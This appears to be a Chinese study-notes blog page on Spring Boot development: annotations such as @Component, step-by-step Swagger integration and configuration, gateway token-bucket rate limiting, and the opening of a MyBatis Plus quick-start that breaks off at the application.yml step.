<p><strong>Controller层</strong>像是一个<strong>服务员</strong>，他把客人（前端）点的菜（数据、请求的类型等）进行汇总什么口味、咸淡、量的多少，交给<strong>厨师长</strong>（Service层），厨师长则告诉沾板厨师（Dao 1）、汤料房（Dao 2）、配菜厨师（Dao 3）等（统称Dao层）我需要什么样的半成品，<strong>副厨们</strong>（Dao层）就负责完成<strong>厨师长</strong>（Service）交代的任务。不知道这个比喻是否合适。</p>
<p>@restcontoller</p>
<p>ResponseBody 直接返回,不去找页面,相当于服务员直接帮你拿个纸巾. 静态资源(经理)就是普通controller不能处理,得自己去处理,经理再处理不了就返回404</p>
<p>父项目作依赖管理</p>
<p>@component （把普通pojo实例化到spring容器中，相当于配置文件中的<br><bean id="" class=""/>）</p>
<p>泛指各种组件，就是说当我们的类不属于各种归类的时候（不属于@Controller、@Services等的时候），我们就可以使用@Component来标注这个类。</p>
<blockquote>
<p>proxyBeanMethods属性默认值是true,也就是说该配置类会被代理（CGLIB），在同一个配置文件中调用其它被@Bean注解标注的方法获取对象时会直接从IOC容器之中获取；</p>
</blockquote>
<p>注解的意思是proxyBeanMethods配置类是用来指定@Bean注解标注的方法是否使用代理，默认是true使用代理，直接从IOC容器之中取得对象；如果设置为false,也就是不使用注解，每次调用@Bean标注的方法获取到的对象和IOC容器中的都不一样，是一个新的对象，所以我们可以将此属性设置为false来提高性能；</p>
<p>其实是为了启动变得更快，false的时候不进容器，true的时候进容器。进容器前还需要经过一层代理，导致启动比false的时候慢了。</p>
<p>thymeleaf不适合高并发</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022649.png" alt="img"></p>
<h2 id="Spring中-Component的作用"><a href="#Spring中-Component的作用" class="headerlink" title="Spring中@Component的作用"></a>Spring中@Component的作用</h2><p>1、@controller 控制器（注入服务）</p>
<ul>
<li>用于标注控制层，相当于struts中的action层</li>
</ul>
<p>2、@service 服务（注入dao）</p>
<ul>
<li>用于标注服务层，主要用来进行业务的逻辑处理</li>
</ul>
<p>3、@repository（实现dao访问）</p>
<ul>
<li>用于标注数据访问层，也可以说用于标注数据访问组件，即DAO组件.</li>
</ul>
<p>4、@component （把普通pojo实例化到spring容器中，相当于配置文件中的<br><code>&lt;bean id=&quot;&quot; class=&quot;&quot;/&gt;</code>）</p>
<ul>
<li>泛指各种组件，就是说当我们的类不属于各种归类的时候（不属于@Controller、@Services等的时候），我们就可以使用@Component来标注这个类。</li>
</ul>
<p>案例：<br><code>&lt;context:component-scan base-package=”com.*”&gt;</code><br>上面的这个例子是引入Component组件的例子，其中base-package表示为需要扫描的所有子包。<br>共同点：被@controller 、@service、@repository 、@component 注解的类，都会把这些类纳入进spring容器中进行管理</p>
<h1 id="Springboot集成Swagger"><a href="#Springboot集成Swagger" class="headerlink" title="Springboot集成Swagger"></a>Springboot集成Swagger</h1><h2 id="Swagger简介"><a href="#Swagger简介" class="headerlink" title="Swagger简介"></a>Swagger简介</h2><p><strong>前后端分离</strong></p>
<ul>
<li>前端 -&gt; 前端控制层、视图层<ul>
<li>伪造后端数据，json。不需要后端，前端工程依旧能够跑起来</li>
</ul>
</li>
<li>后端 -&gt; 后端控制层、服务层、数据访问层</li>
<li>前后端通过API进行交互</li>
<li>前后端相对独立且松耦合</li>
<li>前后端甚至可以部署在不同的服务器上</li>
</ul>
<p><strong>产生的问题</strong></p>
<ul>
<li>前后端集成，前端或者后端无法做到“及时协商，尽早解决”，最终导致问题集中爆发</li>
</ul>
<p><strong>解决方案</strong></p>
<ul>
<li>首先定义schema [ 计划的提纲 ]，并实时跟踪最新的API，降低集成风险</li>
<li>早些年：指定word计划文档；用git</li>
<li>前后端分离：<ul>
<li>前端测试后端接口：postman</li>
<li>后端提供接口，需要实时更新最新的消息及改动！</li>
</ul>
</li>
</ul>
<p><strong>Swagger</strong></p>
<ul>
<li>号称世界上最流行的API框架</li>
<li>Restful Api 文档在线自动生成器 &#x3D;&gt; <strong>API 文档 与API 定义同步更新</strong></li>
<li>直接运行，在线测试API</li>
<li>支持多种语言 （如：Java，PHP等）</li>
<li>官网：<a href="https://swagger.io/">https://swagger.io/</a></li>
</ul>
<p>在项目使用swagger需要springbox</p>
<h2 id="SpringBoot集成Swagger"><a href="#SpringBoot集成Swagger" class="headerlink" title="SpringBoot集成Swagger"></a>SpringBoot集成Swagger</h2><p><strong>SpringBoot集成Swagger</strong> &#x3D;&gt; <strong>springfox</strong>，两个jar包</p>
<ul>
<li>Springfox-swagger2</li>
<li>swagger-springmvc</li>
</ul>
<p><strong>使用Swagger</strong></p>
<p>要求：jdk 1.8 + 否则swagger2无法运行</p>
<p>步骤：</p>
<p>1、新建一个SpringBoot-web项目</p>
<p>2、添加Maven依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/io.springfox/springfox-swagger2 --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">   &lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt;</span><br><span class="line">   &lt;version&gt;2.9.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;!-- https://mvnrepository.com/artifact/io.springfox/springfox-swagger-ui --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">   &lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt;</span><br><span class="line">   &lt;version&gt;2.9.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>3、编写HelloController，测试确保运行成功！</p>
<p>此时有两个请求，一个是返回默认错误页面，一个是hello请求。</p>
<p>4、要使用Swagger，我们需要编写一个配置类-SwaggerConfig来配置 Swagger</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Configuration //配置类</span><br><span class="line">@EnableSwagger2// 开启Swagger2的自动配置</span><br><span class="line">public class SwaggerConfig &#123;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5、访问测试 ：<a href="http://localhost:8080/swagger-ui.html">http://localhost:8080/swagger-ui.html</a> ，可以看到swagger的界面；</p>
<p><img src="/leyou.assets/640" alt="图片"></p>
<h2 id="配置Swagger"><a href="#配置Swagger" class="headerlink" title="配置Swagger"></a>配置Swagger</h2><p>1、Swagger实例Bean是Docket，所以通过配置Docket实例来配置Swaggger。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span> <span class="comment">//配置docket以配置Swagger具体参数</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、可以通过apiInfo()属性配置文档信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//配置文档信息</span></span><br><span class="line"><span class="keyword">private</span> ApiInfo <span class="title function_">apiInfo</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">Contact</span> <span class="variable">contact</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Contact</span>(<span class="string">&quot;联系人名字&quot;</span>, <span class="string">&quot;http://xxx.xxx.com/联系人访问链接&quot;</span>, <span class="string">&quot;联系人邮箱&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ApiInfo</span>(</span><br><span class="line">           <span class="string">&quot;Swagger学习&quot;</span>, <span class="comment">// 标题</span></span><br><span class="line">           <span class="string">&quot;学习演示如何配置Swagger&quot;</span>, <span class="comment">// 描述</span></span><br><span class="line">           <span class="string">&quot;v1.0&quot;</span>, <span class="comment">// 版本</span></span><br><span class="line">           <span class="string">&quot;http://terms.service.url/组织链接&quot;</span>, <span class="comment">// 组织链接</span></span><br><span class="line">           contact, <span class="comment">// 联系人信息</span></span><br><span class="line">           <span class="string">&quot;Apach 2.0 许可&quot;</span>, <span class="comment">// 许可</span></span><br><span class="line">           <span class="string">&quot;许可链接&quot;</span>, <span class="comment">// 许可连接</span></span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()<span class="comment">// 扩展</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3、Docket 实例关联上 apiInfo()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2).apiInfo(apiInfo());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4、重启项目，访问测试 <a href="http://localhost:8080/swagger-ui.html">http://localhost:8080/swagger-ui.html</a>  看下效果；</p>
<h2 id="配置扫描接口"><a href="#配置扫描接口" class="headerlink" title="配置扫描接口"></a>配置扫描接口</h2><p>1、构建Docket时通过select()方法配置怎么扫描接口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">      .apiInfo(apiInfo())</span><br><span class="line">      .select()</span><br><span class="line">      <span class="comment">// 通过.select()方法，去配置扫描接口,RequestHandlerSelectors配置如何扫描接口</span></span><br><span class="line">      <span class="comment">// RequestHandlerselectors,配置要扫描接口的方式</span></span><br><span class="line">      <span class="comment">// basepackage：指定要扫描的包</span></span><br><span class="line">      <span class="comment">// any() :扫描全部</span></span><br><span class="line">      <span class="comment">// none() : 不扫描</span></span><br><span class="line">      <span class="comment">// withclassAnnotation：扫描类上的注解</span></span><br><span class="line">      <span class="comment">// withclassAnnotation：扫描方法上的注解</span></span><br><span class="line">      .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.kuang.swagger.controller&quot;</span>))</span><br><span class="line">      .build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、重启项目测试，由于我们配置根据包的路径扫描接口，所以我们只能看到一个类</p>
<p>3、除了通过包路径配置扫描接口外，还可以通过配置其他方式扫描接口，这里注释一下所有的配置方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">any() <span class="comment">// 扫描所有，项目中的所有接口都会被扫描到</span></span><br><span class="line">none() <span class="comment">// 不扫描接口</span></span><br><span class="line"><span class="comment">// 通过方法上的注解扫描，如withMethodAnnotation(GetMapping.class)只扫描get请求</span></span><br><span class="line">withMethodAnnotation(<span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; annotation)</span><br><span class="line"><span class="comment">// 通过类上的注解扫描，如.withClassAnnotation(Controller.class)只扫描有controller注解的类中的接口</span></span><br><span class="line">withClassAnnotation(<span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; annotation)</span><br><span class="line">basePackage(<span class="keyword">final</span> String basePackage) <span class="comment">// 根据包路径扫描接口</span></span><br></pre></td></tr></table></figure>

<p>4、除此之外，我们还可以配置接口扫描过滤：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">      .apiInfo(apiInfo())</span><br><span class="line">      .select()<span class="comment">// 通过.select()方法，去配置扫描接口,RequestHandlerSelectors配置如何扫描接口</span></span><br><span class="line">      .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.kuang.swagger.controller&quot;</span>))</span><br><span class="line">       <span class="comment">// 配置如何通过path过滤,即这里只扫描请求以/kuang开头的接口</span></span><br><span class="line">      .paths(PathSelectors.ant(<span class="string">&quot;/kuang/**&quot;</span>))</span><br><span class="line">      .build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5、这里的可选值还有</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">any() <span class="comment">// 任何请求都扫描</span></span><br><span class="line">none() <span class="comment">// 任何请求都不扫描</span></span><br><span class="line">regex(<span class="keyword">final</span> String pathRegex) <span class="comment">// 通过正则表达式控制</span></span><br><span class="line">ant(<span class="keyword">final</span> String antPattern) <span class="comment">// 通过ant()控制</span></span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022651.png" alt="图片"></p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="配置Swagger开关"><a href="#配置Swagger开关" class="headerlink" title="配置Swagger开关"></a>配置Swagger开关</h2><p>1、通过enable()方法配置是否启用swagger，如果是false，swagger将不能在浏览器中访问了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">      .apiInfo(apiInfo())</span><br><span class="line">      .enable(<span class="literal">false</span>) <span class="comment">//配置是否启用Swagger，如果是false，在浏览器将无法访问</span></span><br><span class="line">      .select()<span class="comment">// 通过.select()方法，去配置扫描接口,RequestHandlerSelectors配置如何扫描接口</span></span><br><span class="line">      .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.kuang.swagger.controller&quot;</span>))</span><br><span class="line">       <span class="comment">// 配置如何通过path过滤,即这里只扫描请求以/kuang开头的接口</span></span><br><span class="line">      .paths(PathSelectors.ant(<span class="string">&quot;/kuang/**&quot;</span>))</span><br><span class="line">      .build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、如何动态配置当项目处于test、dev环境时显示swagger，处于prod时不显示？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket</span><span class="params">(Environment environment)</span> &#123;</span><br><span class="line">   <span class="comment">// 设置要显示swagger的环境</span></span><br><span class="line">   <span class="type">Profiles</span> <span class="variable">of</span> <span class="operator">=</span> Profiles.of(<span class="string">&quot;dev&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">   <span class="comment">// 判断当前是否处于该环境</span></span><br><span class="line">   <span class="comment">// 通过 enable() 接收此参数判断是否要显示</span></span><br><span class="line">   <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> environment.acceptsProfiles(of);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">      .apiInfo(apiInfo())</span><br><span class="line">      .enable(b) <span class="comment">//配置是否启用Swagger，如果是false，在浏览器将无法访问</span></span><br><span class="line">      .select()<span class="comment">// 通过.select()方法，去配置扫描接口,RequestHandlerSelectors配置如何扫描接口</span></span><br><span class="line">      .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.kuang.swagger.controller&quot;</span>))</span><br><span class="line">       <span class="comment">// 配置如何通过path过滤,即这里只扫描请求以/kuang开头的接口</span></span><br><span class="line">      .paths(PathSelectors.ant(<span class="string">&quot;/kuang/**&quot;</span>))</span><br><span class="line">      .build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3、可以在项目中增加一个dev的配置文件查看效果！</p>
<p><img src="/leyou.assets/640-20201226160302755" alt="图片"></p>
<h2 id="配置API分组"><a href="#配置API分组" class="headerlink" title="配置API分组"></a>配置API分组</h2><p><img src="/leyou.assets/640-20201226160302754" alt="图片"></p>
<p>1、如果没有配置分组，默认是default。通过groupName()方法即可配置分组：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket</span><span class="params">(Environment environment)</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2).apiInfo(apiInfo())</span><br><span class="line">      .groupName(<span class="string">&quot;hello&quot;</span>) <span class="comment">// 配置分组</span></span><br><span class="line">       <span class="comment">// 省略配置....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、重启项目查看分组</p>
<p>3、如何配置多个分组？配置多个分组只需要配置多个docket即可：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket1</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2).groupName(<span class="string">&quot;group1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket2</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2).groupName(<span class="string">&quot;group2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Docket <span class="title function_">docket3</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2).groupName(<span class="string">&quot;group3&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4、重启项目查看即可</p>
<h2 id="实体配置"><a href="#实体配置" class="headerlink" title="实体配置"></a>实体配置</h2><p>1、新建一个实体类</p>
<p>Api只是给注释而已，并没什么用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiModel(&quot;用户实体&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">   <span class="meta">@ApiModelProperty(&quot;用户名&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String username;</span><br><span class="line">   <span class="meta">@ApiModelProperty(&quot;密码&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String password;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、只要这个实体在<strong>请求接口</strong>的返回值上（即使是泛型），都能映射到实体项中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/getUser&quot;)</span></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">getUser</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3、重启查看测试</p>
<p><img src="/leyou.assets/640-20201226160302753" alt="图片"></p>
<p>注：并不是因为@ApiModel这个注解让实体显示在这里了，而是只要出现在接口方法的返回值上的实体都会显示在这里，而@ApiModel和@ApiModelProperty这两个注解只是为实体添加注释的。</p>
<p>@ApiModel为类添加注释</p>
<p>@ApiModelProperty为类属性添加注释</p>
<h2 id="常用注解"><a href="#常用注解" class="headerlink" title="常用注解"></a>常用注解</h2><p>Swagger的所有注解定义在io.swagger.annotations包下</p>
<p>下面列一些经常用到的，未列举出来的可以另行查阅说明：</p>
<table>
<thead>
<tr>
<th>Swagger注解</th>
<th>简单说明</th>
</tr>
</thead>
<tbody><tr>
<td>@Api(tags &#x3D; “xxx模块说明”)</td>
<td>作用在模块类上</td>
</tr>
<tr>
<td>@ApiOperation(“xxx接口说明”)</td>
<td>作用在接口方法上</td>
</tr>
<tr>
<td>@ApiModel(“xxxPOJO说明”)</td>
<td>作用在模型类上：如VO、BO</td>
</tr>
<tr>
<td>@ApiModelProperty(value &#x3D; “xxx属性说明”,hidden &#x3D; true)</td>
<td>作用在类方法和属性上，hidden设置为true可以隐藏该属性</td>
</tr>
<tr>
<td>@ApiParam(“xxx参数说明”)</td>
<td>作用在参数、方法和字段上，类似@ApiModelProperty</td>
</tr>
</tbody></table>
<p>我们也可以给请求的接口配置一些注释</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiOperation(&quot;狂神的接口&quot;)</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/kuang&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">kuang</span><span class="params">(<span class="meta">@ApiParam(&quot;这个名字会被返回&quot;)</span>String username)</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> username;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样的话，可以给一些比较难理解的属性或者接口，增加一些配置信息，让人更容易阅读！</p>
<p>相较于传统的Postman或Curl方式测试接口，使用swagger简直就是傻瓜式操作，不需要额外说明文档(写得好本身就是文档)而且更不容易出错，只需要录入数据然后点击Execute，如果再配合自动化框架，可以说基本就不需要人为操作了。</p>
<p>Swagger是个优秀的工具，现在国内已经有很多的中小型互联网公司都在使用它，相较于传统的要先出Word接口文档再测试的方式，显然这样也更符合现在的快速迭代开发行情。当然了，提醒下大家在正式环境要记得关闭Swagger，一来出于安全考虑二来也可以节省运行时内存。</p>
<h2 id="拓展：其他皮肤"><a href="#拓展：其他皮肤" class="headerlink" title="拓展：其他皮肤"></a>拓展：其他皮肤</h2><p>我们可以导入不同的包实现不同的皮肤定义：</p>
<p>1、默认的  <strong>访问 <a href="http://localhost:8080/swagger-ui.html">http://localhost:8080/swagger-ui.html</a></strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/leyou.assets/640-20201226160302756" alt="图片"></p>
<p>2、bootstrap-ui  <strong>访问 <a href="http://localhost:8080/doc.html">http://localhost:8080/doc.html</a></strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入swagger-bootstrap-ui包 /doc.html--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.xiaoymin<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>swagger-bootstrap-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/leyou.assets/640-20201226160302600" alt="图片"></p>
<p>3、Layui-ui  <strong>访问 <a href="http://localhost:8080/docs.html">http://localhost:8080/docs.html</a></strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入swagger-ui-layer包 /docs.html--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.caspar-chen<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>swagger-ui-layer<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/leyou.assets/640-20201226160302633" alt="图片"></p>
<p>4、mg-ui  <strong>访问 <a href="http://localhost:8080/document.html">http://localhost:8080/document.html</a></strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入swagger-ui-layer包 /document.html--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.zyplayer<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>swagger-mg-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/leyou.assets/640-20201226160302672" alt="图片"></p>
<h1 id="SpringCloud"><a href="#SpringCloud" class="headerlink" title="SpringCloud"></a>SpringCloud</h1><h2 id="Gateway限流-了解"><a href="#Gateway限流-了解" class="headerlink" title="Gateway限流(了解)"></a>Gateway限流(了解)</h2><p>网关除了请求路由、身份验证，还有一个非常重要的作用：请求限流。当系统面对高并发请求时，为了减少对业务处理服务的压力，需要在网关中对请求限流，按照一定的速率放行请求。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022652.png" alt="image-20200108155348648"></p>
<h3 id="令牌桶算法原理"><a href="#令牌桶算法原理" class="headerlink" title="令牌桶算法原理"></a>令牌桶算法原理</h3><p>SpringGateway中采用的是令牌桶算法，令牌桶算法原理：</p>
<ul>
<li>准备一个令牌桶，有固定容量，一般为服务并发上限</li>
<li>按照固定速率，生成令牌并存入令牌桶，如果桶中令牌数达到上限，就丢弃令牌。</li>
<li>每次请求调用需要先获取令牌，只有拿到令牌，才继续执行，否则选择选择等待或者直接拒绝。</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022653.png" alt="image-20200108161959810"></p>
<h1 id="MyBatis-Plus"><a href="#MyBatis-Plus" class="headerlink" title="MyBatis Plus"></a>MyBatis Plus</h1><p>国产的开源框架，基于 MyBatis</p>
<p>核心功能就是简化 MyBatis 的开发，提高效率。</p>
<h3 id="MyBatis-Plus-快速上手"><a href="#MyBatis-Plus-快速上手" class="headerlink" title="MyBatis Plus 快速上手"></a>MyBatis Plus 快速上手</h3><p>Spring Boot(2.3.0) + MyBatis Plus（国产的开源框架，并没有接入到 Spring 官方孵化器中）</p>
<p>1、创建 Maven 工程</p>
<p></p>
<p>2、pom.xml 引入 MyBatis Plus 的依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.1.tmp<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>3、创建实体类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4、创建 Mapper 接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.mapper.BaseMapper;</span><br><span class="line"><span class="keyword">import</span> com.southwind.mybatisplus.entity.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;User&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5、application.yml</p>
